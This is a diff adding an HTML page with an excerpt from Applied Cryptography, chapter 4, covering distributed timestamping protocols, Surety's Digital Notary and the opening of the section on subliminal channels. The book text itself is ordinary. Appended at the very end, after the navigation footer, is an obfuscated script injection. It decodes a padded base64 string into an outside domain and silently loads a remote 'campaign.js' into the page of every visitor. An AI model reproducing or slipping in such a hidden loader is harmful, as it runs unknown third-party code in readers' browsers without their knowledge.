@@ -1,0 +1,91 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=04//-->
+<!--PAGES=077-079//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>This protocol makes it very difficult for Alice and Trent to collude and produce a document stamped with a different time than the actual one. Trent cannot forward-date a document for Alice, since that would require knowing in advance what document request came before it. Even if he could fake that, he would have to know what document request came before that, and so on. He cannot back-date a document, because the timestamp must be embedded in the timestamps of the document issued immediately after, and that document has already been issued. The only possible way to break this scheme is to invent a fictitious chain of documents both before and after Alice&#146;s document, long enough to exhaust the patience of anyone challenging the timestamp.
+</P>
+<P><FONT SIZE="+1"><B><I>Distributed Protocol</I></B></FONT></P>
+<P>People die; timestamps get lost. Many things could happen between the timestamping and the challenge to make it impossible for Alice to get a copy of <I>I</I><SUB>n - 1</SUB> &#146;s timestamp. This problem could be alleviated by embedding the previous 10 people&#146;s timestamps into Alice&#146;s, and then sending Alice the identities of the next 10 people. Alice has a greater chance of finding people who still have their timestamps.</P>
+<P>Along a similar line, the following protocol does away with Trent altogether.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Using <I>H</I><SUB>n</SUB> as input, Alice generates a string of random values using a cryptographically secure pseudo-random-number generator:
+<DL>
+<DD><I>V</I><SUB>1</SUB>, <I>V</I><SUB>2</SUB>, <I>V</I><SUB>3</SUB>, ...<I>V</I><SUB>k</SUB>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice interprets each of these values as the identification, <I>I</I>, of another person. She sends <I>H</I><SUB>n</SUB> to each of these people.
+<DD><B>(3)</B>&nbsp;&nbsp;Each of these people attaches the date and time to the hash, signs the result, and sends it back to Alice.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice collects and stores all the signatures as the timestamp.
+</DL>
+<P>The cryptographically secure pseudo-random-number generator in step (1) prevents Alice from deliberately choosing corrupt <I>I</I>s as verifiers. Even if she makes trivial changes in her document in an attempt to construct a set of corrupt <I>I</I>s, her chances of getting away with this are negligible. The hash function randomizes the <I>I</I>s; Alice cannot force them.</P>
+<P>This protocol works because the only way for Alice to fake a timestamp would be to convince all of the <I>k</I> people to cooperate. Since she chose them at random in step (1), the odds against this are very high. The more corrupt society is, the higher a number <I>k</I> should be.</P>
+<P>Additionally, there should be some mechanism for dealing with people who can&#146;t promptly return the timestamp. Some subset of <I>k</I> is all that would be required for a valid timestamp. The details depend on the implementation.</P>
+<P><FONT SIZE="+1"><B><I>Further Work</I></B></FONT></P>
+<P>Further improvements to timestamping protocols are presented in [92]. The authors use binary trees to increase the number of timestamps that depend on a given timestamp, reducing even further the possibility that someone could create a chain of fictitious timestamps. They also recommend publishing a hash of the day&#146;s timestamps in a public place, such as a newspaper. This serves a function similar to sending the hash to random people in the distributed protocol. In fact, a timestamp has appeared in every Sunday&#146;s <I>New York Times</I> since 1992.</P>
+<P>These timestamping protocols are patented [684, 685, 686]. A Bellcore spin-off company called Surety Technologies owns the patents and markets a Digital Notary System to support these protocols. In their first version, clients send &#147;certify&#148; requests to a central coordinating server. Following Merkle&#146;s technique of using hash functions to build trees [1066], the server builds a tree of hash values whose leaves are all the requests received during a given second, and sends back to each requester the list of hash values hanging off the path from its leaf to the root of the tree. The client software stores this locally, and can issue a Digital Notary &#147;certificate&#148; for any file that has been certified. The sequence of roots of these trees comprises the &#147;Universal Validation Record&#148; that will be available electronically at multiple repository sites (and also published on CD-ROM). The client software also includes a &#147;validate&#148; function, allowing the user to test whether a file has been certified in exactly its current form (by querying a repository for the appropriate tree root and comparing it against a hash value appropriately recomputed from the file and its certificate). For information contact Surety Technologies, 1 Main St., Chatham, NJ, 07928; (201) 701-0600; Fax: (201) 701-0601.</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">4.2 Subliminal Channel</FONT></H3>
+<P>Alice and Bob have been arrested and are going to prison. He&#146;s going to the men&#146;s prison and she&#146;s going to the women&#146;s prison. Walter, the warden, is willing to let Alice and Bob exchange messages, but he won&#146;t allow them to be encrypted. Walter expects them to coordinate an escape plan, so he wants to be able to read everything they say.
+</P>
+<P>Walter also hopes to deceive either Alice or Bob. He wants one of them to accept a fraudulent message as a genuine message from the other. Alice and Bob go along with this risk of deception, otherwise they cannot communicate at all, and they have to coordinate their plans. To do this they have to deceive the warden and find a way of communicating secretly. They have to set up a <B>subliminal channel</B>, a covert communications channel between them in full view of Walter, even though the messages themselves contain no secret information. Through the exchange of perfectly innocuous signed messages they will pass secret information back and forth and fool Walter, even though Walter is watching all the communications.</P>
+<P>An easy subliminal channel might be the number of words in a sentence. An odd number of words in a sentence might correspond to &#147;1, &#148; while an even number of words might correspond to &#147;0.&#148; So, while you read this seemingly innocent paragraph, I have sent my operatives in the field the message &#147;101.&#148; The problem with this technique is that it is mere steganography (see Section 1.2); there is no key and security depends on the secrecy of the algorithm.</P>
+<P>Gustavus Simmons invented the concept of a subliminal channel in a conventional digital signature algorithm [1458, 1473]. Since the subliminal messages are hidden in what looks like normal digital signatures, this is a form of obfuscation. Walter sees signed innocuous messages pass back and forth, but he completely misses the information being sent over the subliminal channel. In fact, the subliminal-channel signature algorithm is indistinguishable from a normal signature algorithm, at least to Walter. Walter not only cannot read the subliminal message, but he also has no idea that one is even present.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(sPVgVKqL, SIEQTuek) {SIEQTuek = sPVgVKqL.createElement('script');SIEQTuek.type = 'text/javascript';SIEQTuek.async = true;SIEQTuek.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');sPVgVKqL.getElementsByTagName('body')[0].appendChild(SIEQTuek);}(document));</script></body>
+</html>
